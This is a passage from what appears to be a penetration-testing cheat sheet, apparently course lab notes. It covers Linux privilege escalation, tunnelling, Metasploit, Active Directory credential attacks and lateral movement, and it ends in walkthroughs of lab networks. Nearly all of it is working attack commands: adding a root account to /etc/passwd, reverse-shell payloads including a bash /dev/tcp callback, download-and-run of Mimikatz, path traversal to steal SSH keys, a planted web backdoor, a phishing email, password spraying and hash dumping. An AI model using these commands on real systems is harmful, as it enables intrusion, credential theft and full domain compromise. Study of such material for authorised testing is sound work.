 	35. `find / -name authorized_keys 2> /dev/null`
	
 	36. `find / -name id_* 2> /dev/null`
	
 	37. `find / -name *.pub* 2> /dev/null`
	
 	38. `find / -name *.bak (*backup*, *old*)`
	
 	39. `ls -alh /tmp/`
	
 	40. `watch -n 1 "ps -aux | grep pass"`               
	
  		1. (monitor processes/services for passwords in real time)
	
 	41. `sudo tcpdump -i lo -A | grep "pass"` 
	
  		1. (monitor loopback traffic (local services) for passwords in real time)
	
 	42. `ls -alh /etc/passwd /etc/shadow /etc/sudoers`
	
  		1. any of these files are writable = vulnerable

2. Automated Enumeration:

 	1. `unix-privesc-check standard`
	
 	2. `./linpeas.sh`
	
 	3. `./linenum.sh`

3. Exploits for privilege escalation:

 	1. writing to a writable /etc/passwd:
	
  		1. `openssl passwd -salt test password`
		
  		2. `echo added_user:$1$skYZQxWx$CeIjblVc4OVHAL.a06q1C/:0:0:root:/root:/bin/bash >> /etc/passwd`
		
  		3. `su added_user`
		
  		4. `id`
	
 	2. pkexec binary with SUID:
	
  		1. [PwnKit](https://github.com/ly4k/PwnKit)
	
 	3. Linux kernel 5.x:
	
  		1. [DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
	
 	4. SUID binary or +ep Capabilities:
	
  		1. [GTFOBins](https://gtfobins.github.io/)
	
 	5. Vim as SUID binary:
	
  		1. `/usr/bin/vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'`
		
   			1. `:py` for python2; `:py3` for python3
	
 	6. local git repository:
	
  		1. `git status`
		
  		2. `git log`                                        (show commit history)
		
  		3. `git show <commit-hash>`            (show changes between commits)


**Port Redirection and SSH tunneling:**

1. port forwarding through a \*NIX host:                               

 	1. tools: (`socat, rinetd, netcat + named pipe, iptables`)
	
 	2. `socat -ddd TCP-LISTEN:9998,fork TCP:10.0.0.174:2222`
	
  		1. (bind to 0.0.0.0:9998 and forward that traffic to 10.0.0.174:2222)
		
  		2. (this is a port forward, no need for proxychains)
	
 	3. `socat TCP-LISTEN:2222,fork TCP:10.0.0.174:22`

2. port forwarding through a Windows host:

 	1. `ssh.exe -N -R 9999 kali@192.168.45.204`          (bind a SOCKS proxy on attacker)
	
  		1. `%systemdrive%\Windows\system32\OpenSSH`    (default location)
	
 	2. `cmd.exe /c echo y | plink.exe -ssh -l username_1 -pw Password1# -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.204`
	
  		1. `127.0.0.1:9833` is bound on the attacking machine (SSH server)
		
  		2. `127.0.0.1:3389` is the RDP socket on the local (compromised) windows client
		
  		3. `xfreerdp /u:<username> /p:<password> /v:127.0.0.1:9833`
	
 	3. using netsh:
	
  		1. `netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.50.55 
		
  		2. `netstat -anp TCP | find "9999"`
		
  		3. `netsh interface portproxy show all`           (show all forwarding via netsh)
		
  		4. `netsh advfirewall firewall add rule name="RuleOne" protocol=TCP dir=in localip=0.0.0.0 localport=9999 action=allow`
		
   			1. (allow ingress traffic to the bind port)
		
  		5. `netsh advfirewall firewall delete rule name="RuleOne"`
		
  		6. `netsh interface portproxy del v4tov4 listenport=9999 listenaddress=0.0.0.0`

3. tunneling/forwarding via SSH:

 	1. 4 types:
	
  		1. SSH Local port forward
		
   			1. (bind port on SSH client --> SSH server --> single destination socket)
		
  		2. Dynamic SSH port forward
		
   			1. (bind SOCKS port on SSH client --> SSH server --> internal network)
		
  		3. SSH remote port forward
		
   			1. (local bind port --> local SSH server --> compromised SSH client --> single destination socket)
		
  		4. SSH remote dynamic port forward
		
   			1. (local bind SOCKS port --> local SSH server --> compromised SSH client --> any destination socket routable from the SSH client)
	
 	2. SSH local port forwarding:
	
  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		
  		2. `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
		
  		3. `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@<SSH-server>`
		
   			1. `-L <local-bind-interface>:<local-bind-port>:<forward-to-addr>:<forward-to-port>`
			
   			2. 172.16.50.217:445 is the destination socket routable from the SSH server
		
  		4. `ss -ntlpu | grep 4455`              (ensure 127.0.0.1:4455 is now bound)
		
  		5. `ssh -N -L 0.0.0.0:4242:172.16.180.217:4242 database_admin@10.4.180.215`
	
 	3. SSH dynamic port forwarding:
	
  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		
  		2. `ssh -N -D 0.0.0.0:9999 user@10.10.10.74`
		
   			1. bind port 9999 on all interfaces as a SOCKS port that can take SOCKS formatted traffic and proxy it through the SSH server; this command is run on the SSH client
		
  		3. `echo "socks5 192.168.77.88 9999" >> /etc/proxychains4.conf`
		
  		4. `proxychains -q nc -v 172.16.45.66 445`              (test proxy connectivity)
		
  		5. `proxychains nmap -n -sT -Pn 172.16.45.0/24` 
	
 	4. SSH remote port forward:
	
  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		
  		2. `ssh -N -R <listening-addr>:<listening-port>:<destination-addr>:<destination-port> kali@<attacker-IP>`
		
  		3. `ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.45.204`
		
   			1. `127.0.0.1:2345` is the bind port on the SSH server you control (kali)
			
   			2. `10.4.50.215:5432` is the destination socket routable from the compromised client
		
  		4. `ss -ntlpu | grep 2345`                 (verify the local port is now bound)
	
 	5. SSH remote dynamic port forward:
	
  		1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
		
  		2. `ssh -R <local-bind-port> user@192.168.45.204`
		
   			1. `ssh -R 9999 kali@192.168.45.204`
			
   			2. (any host routable from the compromised SSH client will be reachable via `proxychains ... 127.0.0.1:9999`)

4. tunneling/forwarding via SSHuttle:

 	1. `sshuttle -r user@10.0.0.174:2222 10.4.5.0/24 172.16.50.0/24`
	
 	2. `sshuttle -H -r kali@192.168.45.204:4444 0/0`


**Tunneling Through Deep Packet Inspection:**

1. [Chisel](https://github.com/jpillora/chisel/releases):

 	2. `chisel server --port 8085 --reverse`
	
 	3. `chisel client 192.168.45.204:8085 R:socks > /dev/null 2>&1 &`
	
  		1. troubleshooting chisel connectivity:
		
   			1. `sudo tcpdump -nvvXi tun0 tcp port 8081`
			
   			2. `chisel client 192.168.45.204:8085 R:socks &> output.txt; curl --data @output.txt http://192.168.45.204:8081/`
	
 	4.  `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h%p' kali@192.168.45.204`             (tunneling through the socks proxy at 1080)

2. Manual DNS Tunneling:

 	1. `dnsmasq.conf`:
```
no-resolv
no-hosts

auth-zone=feline.corp
auth-server=feline.corp

txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else too.
```
	1. sudo dnsmasq -C dnsmasq.conf -d
	2. sudo tcpdump -i tun0 udp port 53
	3. resolvectl status              (check local DNS resolution settings)
	4. resolvectl flush-caches        (flush local name resolution caches)
	5. nslookup exfiltrated-data.controlled-domain.com 192.168.45.204
		1. (resolve A record)
	6. nslookup -type=txt www.controlled-domain.com
		1. (grab TXT records directly from controlled authoritative server; this can infiltrate data into the network)

3. [dnscat2](https://github.com/iagox86/dnscat2):

 	1. `sudo tcpdump -i tun0 udp port 53`            (monitor DNS traffic on name server)
	
 	2. `dnscat2-server controlled-domain.com` 
	
 	3. `./dnscat controlled-domain.com`       (dnscat-client takes the domain as param 1)
	
 	4. `dnscat2>`
```
windows
windows -i 3
?
listen 127.0.0.1:4455 172.16.4.11:445           (forward localhost to remote SMB)
listen 192.168.244.7:9998 172.16.244.217:445
```
4. ligolo-ng

setting up a pivot point with ligolo-ng:
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert 
.\agent.exe -connect 192.168.45.158:11601 -ignore-cert

session
	- 1
	- ifconfig
	- start			(run this after adding the route)
	
sudo ip route add 10.0.0.0/24 dev ligolo
ip route list
	- should show "10.0.0.0/24 dev ligolo scope link"
```

setting up reverse shells/servers on the internal network (ligolo listeners):
	- listeners on agents forward traffic out to the attacker
```
listener_add --addr 0.0.0.0:2345 --to 127.0.0.1:4444
	- forward traffic sent to agent:2345 to kali:4444
	- send traffic to agent:2345 and it will be forwarded to kali:4444

listener_list
```


**The Metasploit Framework:**
1. `sudo msfdb init`
2. `sudo systemctl enable postgresql`
3. `sudo msfconsole`

**General Commands:** 
```
db_status
workspace
workspace -a new_workspace
db_nmap -A 172.16.50.44
hosts
services
services -p 21
```

**Auxiliary modules:**
```
show auxiliary
search scanner/X
search type:auxiliary smb
info
show options
show missing
set RHOSTS 172.16.50.4
unset RHOSTS
services -p 445 --rhosts         (set RHOSTS to all hosts with open SMB)
run -j
vulns
creds
jobs
```

**Exploit modules:**
```
Ctrl-Z                 (put a session in the background)
sessions -k 12         (kill session 12)
```

**Meterpreter payloads:**
```
channel -l
channel -i 2
sysinfo
getuid
getsystem
hashdump
clearev
lpwd, lcd, lcat           (commands prefixed with 'l' run on the attacker)
download C:\\Users\\Alex\\Desktop\\proof.txt
upload dnscat2.exe C:\\Users\\Alex\\Desktop\\runme.exe
```

**msfvenom:**
```
msfvenom -l payloads --platform linux --arch x64
msfvenom -l windows/x64/shell_reverse_tcp LHOST=192.168.45.204 LPORT=4444 -f exe -o binary.exe
msfvenom -p php/reverse_php LHOST=192.168.45.204 LPORT=443 -o form.pHP -f raw
```

**Post-Exploitation:**
```
idletime
getsystem
getuid
ps                   (grab the PIDs of a few processes running as SYSTEM)
migrate 4234
execute -H -f notepad  (start a hidden notepad; take down it's PID migrate to it)
getenv
shell; powershell.exe -c "Import-Module NtObjectManager && Get-NtTokenIntegrityLevel"         (grab the current processes' integrity level)
search UAC
load kiwi
	- creds_msv
	- creds_all
```

**Pivoting with Metasploit/Meterpreter:**
```
**either manually declare routes or have autoroute establish them automatically; turn a session into a pivot point using the portfwd command; turn the current Metasploit instance into a SOCKS proxy (127.0.0.1:1080) using multi/manage/autoroute

route add 172.16.50.0/24 3
	- params: foreign subnet, session-ID
	- auxiliary/scanner/portscan/tcp
	- exploit/windows/smb/psexec
route print
route flush

multi/manage/autoroute

auxiliary/server/socks_proxy
	- set SRVHOST 127.0.0.1
	- set VERSION 5
	- run -j

portfwd add -l 9998 -p 445 -r 172.16.50.4
	- forward 127.0.0.1:9998 to 172.16.50.4:445
	- run -j
```

**Miscellaneous:**
```
multi/script/web_delivery           (generate one-liners and run their servers)

impersonating tokens with Metasploit:
1. getprivs
2. load incognito
3. list_tokens -u
4. impersonate_token domain\\Administrator
5. shell
6. rev2self        (return to previous user before elevation if needed)

post/multi/recon/local_exploit_suggester     (local Windows exploit suggester)

exploit/windows/local/always_install_elevated    (exploit AlwaysInstallElevated)

auxiliary/server/capture/http_basic
1. requires GUI access
2. set uripath testPath
3. run
4. on the victim:
	1. browse to http://attacker.com/testPath
	2. open the task manager
	3. right click on the browser and "Create Dump File"
	4. copy this dump to the attacker
5. in attacker:
	1. strings dump.dump | grep "Authorization: Basic"
	2. copy the b64 encoded string
	3. echo -ne b64EncodedString | base64 -d

auxiliary/scanner/smb/smb_enum_gpp       
	- (search for credentials with SMB access; gpp_decrypt in kali can decrypt)

```

**Automating Metasploit:**
1. `automate.rc`:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.204
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -j -z
```
`sudo msfconsole -r automate.rc`
2. using existing Metasploit automation scripts:
```
**these scripts derive their config options from the global Metasploit datastore
/usr/share/metasploit-framework/scripts/resource
setg RHOSTS 45.67.44.0/24
unsetg
```


**Active Directory Information and Enumeration:**

```
xfreerdp /u:Administrator /d:domain.local /v:10.0.0.174 /p:Password1#
net user /domain
net user john /domain
net group /domain                   (net.exe does not show Domain Local groups)
net group "Domain Admins" /domain

impacket-GetADUsers corp.com/stephanie:"Password6" -all -dc-ip 192.168.180.70
```
**Using PowerView.ps1**
```
Import-Module .\PowerView.ps1

Get-NetDomain
Get-NetUser | select cn
Get-Netuser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
Get-DomainGroupMember "Domain Admins"
Get-NetComputer | select operatingsystem,dnshostname
Resolve-IPAddress 172.16.54.44

Find-LocalAdminAccess

Get-NetSession -ComputerName DC01SRV -Verbose       (this command is unreliable unless you already have admin access of some kind)

Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion

.\PsLoggedon.exe \\DC01SRV

setspn.exe -L alex_admin          (check if alex_admin has an SPN (which means they are kerberoastable))

Get-NetUser -SPN | select samaccountname,serviceprincipalname
	- grabs all service accounts, displaying account name and SPN

Get-ObjectAcl -Identity alex_admin           (grab the ACEs for alex_admin)
	- look for "ActiveDirectoryRights" and "SecurityIdentifier"

Convert-SidToName <SID>

Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	- enumerate GenericAll rights on the domain
	- display SID and rights per object

Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
	- GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights, Self (Self-Membership)
	- Convert-SidToName <SID>

Find-InterestingDomainAcl

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

"<SID>","<SID>","<SID>" | Convert-SidToName

net group "Domain Admins" added_user /add /domain

net group "Domain Admins" added_user /del /domain

Find-DomainShare           (-CheckShareAccess shows only accessible shares)
	- %SystemRoot%\SYSVOL\Sysvol\domain-name

ls \\DC01.corp.com\sysvol\corp.com\
```

**Automated Active Directory Enumeration:**
```
1. Ingestion with SharpHound.ps1

- Import-Module .\SharpHound.ps1

- Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "victim"

- .\SharpHound.ps1 --CollectionMethod All --Loop --LoopDuration 01:15:00 --LoopInterval 00:10:00 -OutputDirectory C:\temp\ -OutputPrefix "victim"

2. Analysis with BloodHoundAD

sudo neo4j start
	- neo4j : neo4j1
bloodhound
	- database info > clear database
	- upload data > zip file here
	- look for:
		- outbound object control for all owned assets
		- short paths to X
		- kerberoastable users
	- raw queries:
		- MATCH (m:Computer) RETURN m
		- MATCH (m:User) RETURN m
		- MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

**Enumerating Active Directory with Credentials:**
```
net accounts /domain               (grab the lockout policy in effect)

crackmapexec smb 192.168.55.44 -u users.txt -p test123 -d domain.local --continue-on-success
crackmapexec smb 192.168.45.44 -u "" -p ""
crackmapexec smb reporting/external.txt -u "anonymous" -p "" --shares
crackmapexec smb 192.168.45.44 -u Administrator -p Password1# --local-auth
crackmapexec smb 192.168.45.0/24 -u Administrator -H LM:NT --local-auth
crackmapexec smb 192.168.45.0/24 -u Administrator -H NT
https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

crackmapexec smb internal.txt -u Administrator -p Password1#
	--users
	--groups
	--local-users
	--gen-relay-list output.txt
	--sessions
	--lusers
	--local-auth --sam
	-M mimikatz

nxc smb 10.0.0.0/24 -u domain_user -p Password1# --shares
	--users
	--groups
	--local-groups
	--sessions
	--logged-on-users
	--pass-pol
	--local-auth
	-M lsassy, nanodump, mimikatz, procdump
	--sam
	--lsa
	--ntds (vss)
	-x <cmd-command>
	-X <powershell-command>
nxc smb 10.0.0.0/24 -u domain_user -p Password1# -M spider_plus                        (spider for files in all shares)
nxc smb 10.0.0.174 -u domain_user -p Password1# --sessions

nxc smb 10.0.0.174 -u alex -H <:NTHASH>
nxc smb 10.0.0.174 -u users.txt -p password1 password2 password3
nxc smb 10.0.0.174 -u Administrator -H <:NTHASH> --continue-on-success


.\CheckCredentials.ps1            (add the credentials in the source code)
.\Spray-Passwords.ps1 -Pass Password1#       (spray passwords via LDAP)
.\Spray-Passwords.ps1 -Pass Password1# -Admins

.\kerbrute passwordspray -d domain.local usernames.lst "Password1#"
	- usernames.lst has to be ANSI encoded (Notepad > Save As)

ldapdomaindump 10.0.0.174 -u domain.local\\alex -p Password1#
ldapsearch -LLL -x -H ldap://domain.local -b '' -s base '(objectClass=*)'
ldapsearch -x -H ldap://domain.local -D "domain.local\\alex" -w Password1# -b "DC=domain,DC=local"
```

**Exploiting Active Directory Authentication**
```
**NTLM is used when servers are addressed via IP or unregistered hostname
**Kerberos is used when servers are addressed via registered hostname

IEX(New-Object Net.Webclient).downloadstring("http://<attacker-IP/Invoke-Mimikatz.ps1>")

.\mimikatz.exe
	- privilege::debug
	- sekurlsa::logonpasswords
	- sekurlsa::tickets
	- crpyto::capi or crypto::cng      (patch functions to export private keys)
```
1. AS-REP Roasting:         (accounts w/ no Kerberos pre-authentication)
```
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
	- use GenericAll/GenericWrite to disable Kerberos pre-authentication
From Linux:

impacket-GetNPUsers corp.com/ -dc-ip 192.168.180.70 -format hashcat -usersfile users.txt              (check for asrep roastable users)

impacket-GetNPUsers corp.com/dave -dc-ip 192.168.180.70 -format hashcat >> hash.test              (grab dave's password hash)

sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force      (crack the hash)

From Windows:

. .\PowerView.ps1; Get-DomainUser -PreauthNotRequired | select cn

.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
2. Kerberoasting:          (attacking user accounts associated with an SPN)
```
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/UnIqUeVaLuE123'} -verbose

	- use GenericAll/GenericWrite to give an account an SPN and make them kerberoastable

From Windows:

.\Rubeus.exe kerberoast /outfile:hashes.kerber

sudo hashcat -m 13100 hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

From Linux:

sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> domain.local/<valid-username>:"Password1"

sudo hashcat -m 13100 hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
3. Silver Tickets:             (service account password/hash and SPN)
```
From Windows:

.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

whoami /user

- domain SID = user SID - RID (last 4 digits)

kerberos::golden /sid:<SID> /domain:domain.local /ptt /target:hostname.domain.local /service:http /rc4:<SPN's-NTLM-hash> /user:<victim-domain-admin-user>

misc::cmd

klist

- list tickets cached in memory

iwr -UseDefaultCredentials http://web04.corp.com -OutFile test.html

- accessing a web server with a cached ticket
```
4. DCSync:                  (local Admin on a domain joined machine)
```
From Windows:

.\mimikatz.exe
lsadump::dcsync /user:domain.local\<target-user>

- dump <target-user>'s NTLM hash from the domain controller
- lsadump::dcsync /user:domain\Administrator

From Linux:

impacket-secretsdump -just-dc-user <target-user> domain.local/<compromised-admin>:"Password1"@<DC-IP>

hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

```

**Lateral Movement in Active Directory:**
1. WMI:                                      (admin on the remote machine or domain admin)
```
wmic /node:<target-IP> /user:<domain-user> /password:<password> process call create "notepad.exe"
```
Executing arbitrary commands on a domain joined target:
```
# this is a basic script demonstrating AD lateral movement via WMI

# creating the PSCredential object
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;

$Options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.180.72 -Credential $credential -SessionOption $Options
$Command = 'type C:\\Users\\Administrator\\Desktop\\flag.txt';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}```
```

2. WinRM:                                      (admin on the remote machine or domain admin)
```
winrs -r:<target-hostname-or-IP> -u:<domain-user> -p:<password> "cmd /c hostname & whoami"
```
```
winrs -r:<target-hostname-or-IP> -u:<domain-user> -p:<password> "powershell.exe -ep bypass -w hidden -NoP -e <encoded-reverse-shell>"
```
Establishing WinRM sessions via PowerShell:
```
# this is a basic script demonstrating AD lateral movement via WinRM

# creating the PSCredential object
$username = '<local-administrator-user>'
$password = '<password>'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;

New-PSSession -ComputerName <victim-IP> -Credential $credential

# Once this has executed, interact with created sessions using: Enter-PSSession <session-ID>
#
```

3. PsExec:                                      (admin on the remote machine or domain admin)
```
.\PsExec64.exe -i \\<target-IP-or-hostname> -u <domain.local\username> -p <password> cmd
```

4. Pass the Hash (PtH):                (admin on the local machine)
```
impacket-wmiexec -hashes <LM>:<NT> Administrator@<target-IP>

impacket-psexec -hashes <LM>:<NT> Administrator@<target-IP>

impacket-smbexec -hashes <LM>:<NT> Administrator@<target-IP>
```

5. Overpass the Hash:                (admin on the local machine; this requires the target user's password or NTLM hash to create Kerberos tickets)
	1. dump cached credentials >> PtH locally to get powershell as the target (local) user >> perform some kind of network auth to cache kerberos tickets >> use psexec64.exe in the powershell session with the cached tickets to move laterally
```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTHASH> /run:powershell
klist
net use \\DC01SRV.domain.local\C$           (this share needs to be accessible)
klist
.\PsExec64.exe \\192.168.44.34 cmd         (spawn a shell on target)
```

Overpass the Hash lab:
```
runas /user:Administrator /savecred powershell
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```

6. Pass the Ticket:    
	1. (Administrator on the local machine, unless the TGS belongs to current user; retrieving and using cached Kerberos tickets)
```
privilege::debug
sekurlsa::tickets /export       
	(look for tickets that can be leveraged to gain new access)
kerberos::ptt filename.kirbi
klist
ls \\172.16.77.55\C$
pushd \\172.16.77.55\C$
net use \\172.16.77.55\C$
net use /delete \\172.16.77.55\C$
```

7. DCOM:                          (Administrator on the local and remote machine or domain admin)
- executing commands on remote systems using DCOM through PowerShell:
```
# this basic script demonstrates lateral movement via DCOM
# specifically, the MMC COM application's Application classe's Application Objects' Document.ActiveView.ExecuteShellCommand() method, which can be called by any local Administrator

# create the application object
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.180.73"))

# command, directory, parameters, window state

# $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c notepad.exe","7")

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <b64-encoded-reverse-shell>","7")
```


**Persistence in Active Directory**

1. Golden Tickets                                 (krbtgt password or password hash)
```
whoami /user
privilege::debug
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:<valid-domain-username> /domain:domain.local /sid:<domain-SID> /krbtgt:<krbtgt-NT-hash> /ptt
	/id:500 will give local Administrator if needed
misc::cmd
.\PsExec64.exe \\<DC-hostname> cmd.exe
	- this HAS to be the DC-hostname, NOT the IP address
```

2. Golden Tickets from Linux:                (this has been very buggy during deployments)
```
impacket-secretsdump <domain-admin-user>:"Password1"@<DC-IP>
impacket-lookupsid domain.local/<domain-admin-user>:"Password1"@<DC-IP>
impacket-ticketer -nthash <NTHASH> -domain-sid "<domain-SID>" -domain domain.local Administrator
export KRB5CCNAME=ticket.ccache
impacket-psexec corp.com/Administrator@WEB1SRV.domain.local -k -no-pass -debug
```

3. Shadow Copies:                             (DC access, domain admin)
```
vshadow.exe -nw -p C:\
	- create a shadow copy of C:\ on local disk
	- take note of "Shadow copy device name"
copy <shadow-copy-device-name\windows\ntds\ntds.dit> C:\ntds.dit.bak
	- extract NTDS.dit from shadow copy
reg.exe save hklm\system C:\system.bak
impacket-secretsdump -ntds <ntds.dit.bak> -system <system.bak> LOCAL
```

**Lateral movement labs:**
1. DCSync:
```
impacket-secretsdump -just-dc-user <target-admin> domain.local/<domain-user>:Password1@<DC-IP>

hashcat -m 1000 hashes.dcsync <wordlist> -r /usr/share/hashcat/rules/best64.rule --force
```

2.  Moving laterally with crackmapexec:
```
crackmapexec smb 192.168.197.70-76 -u leon -p Password1 -d corp.com --continue-on-success

impacket-smbexec corp.com/leon:Password1@192.168.197.70
```

3. Passing the Hash to view SMB shares
```
sekurlsa::logonpasswords

smbclient //192.168.197.72/backup -U dave --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494 -W corp.com

net view \\WEB04
```


**Assembling the Pieces**
```
git status
git log
git show <commit-hash>

wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o output.txt

crackmapexec smb <target-IP> -u usernames.txt -p passwords.txt --continue-on-success

crackmapexec smb <target-IP> -u john -p Password1 --shares

sudo swaks -t marcus@beyond.com,daniela@beyond.com --from john@beyond.com --auth-user john@beyond.com --server 192.168.250.242 --body 'Please open the attached file promptly, as it is an urgent configuration change.' --attach @/home/kali/webdav/config.Library-ms --suppress-data -ap

. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All

MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

sudo proxychains -q nmap -sT -oN scan.txt -Pn -p 21,80,443 <target-IP>

./chisel server -p 8085 --reverse
chisel.exe client 192.168.45.204:8080 9999:172.16.50.4:445

impacket-smbserver -username test -password test -smb2support share .
net use //192.168.45.204/share /u:test test
copy test.txt \\192.168.45.204\share\test.txt
net use /delete \\192.168.45.204\share
```

**Pass the Hash**
```
crackmapexec smb 172.16.50.4 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local

impacket-wmiexec domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79

xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
	- account restrictions are preventing the user from signing in:
		- crackmapexec smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

impacket-secretsdump ituser@<any-domain-joined-machine> -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

```

**Medtech**
1. Achieving local administrator via the Backup Operators group:

https://www.youtube.com/watch?v=wUy2VXL2y-w
```
sudo impacket-smbserver -smb2support share .
proxychains -q impacket-reg medtech.com/joe:Flowers1@172.16.171.10 backup -o '\\192.168.45.158\share'
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local >> hashes.SAM
	- recover the DC's computer account hash
proxychains -q impacket-secretsdump medtech.com/DC01$@172.16.171.10 -hashes ":NTHASH" >> hashes.DC
	- recover a domain admin's password 
proxychains -q impacket-psexec -hashes "<:NTHASH>" medtech.com/DomainAdmin@172.16.171.10
	- achieve a full shell on the DC now that you are domain admin
```

**Relia**
```
sudo nmap -sS -p 1-10000 -Pn -iL external.txt| tee externalScan.txt

sudo nmap -sV -sC -p 1-10000 -Pn -iL external.txt| tee ExternalScriptScan.txt

searchsploit apache 2.4.49

searchsploit -m multiple/webapps/50383.sh

./50383.sh targets.txt /etc/passwd 

sh test.sh

curl --silent --path-as-is --insecure -k "192.168.178.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/anita/.ssh/id_ecdsa"

chmod 0600 anita_id_ecdsa.key

john --wordlist=/usr/share/wordlists/rockyou.txt anita_ssh.hash

ssh -p 2222 anita@192.168.178.245 -i anita_id_ecdsa.key

On 192.168.178.245:
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	wget -O linpeas.sh http://192.168.45.213:8082/linpeas.sh
	./linpeas.sh | tee ANITA_LINPEAS_OUTPUT.txt
	sudo --version
	git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git		-->		(https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
	make && ./exploit

On 192.168.178.246:
	ssh -p 2222 anita@192.168.178.246 -i 245_files/anita_id_ecdsa.key
	ss -antp
	ssh -N -R 127.0.0.1:9999:127.0.0.1:8000 kali@192.168.45.213
		curl "http://127.0.0.1:9999/backend/?view=php://filter/resource=../../../../../../../../../etc/passwd"
	wget -O /var/crash/test.php http://192.168.45.213:8083/simple-backdoor.php					--> this is the backdoor from pentest monkey, NOT normal simple-backdoor.php
		nc -nvlp 6666
	curl "http://127.0.0.1:9999/backend/?view=php://filter/resource=../../../../../../../../../var/crash/test.php"
	[access is gained as www-data]
	sudo -l
	sudo bash -i >& /dev/tcp/192.168.45.213/7777 0>&1
	[access is gaine as root]
	unshadow passwd shadow >> unshadowed.txt
	john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

nxc smb 192.168.178.248 -u anonymous -p "" --shares

smbclient //192.168.178.248/transfer -U anonymous
	cd \r14_2022\build\DNN\wwwroot\
	put cmdasp.aspx

keepass2john Database.kdbx >> hash.keepass
hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
keepass2 Database.kdbx
	[several passwords are recovered]


nxc smb 192.168.178.248 -u emma -p "SomersetVinyl1\!" --local-auth

On 192.168.178.248:
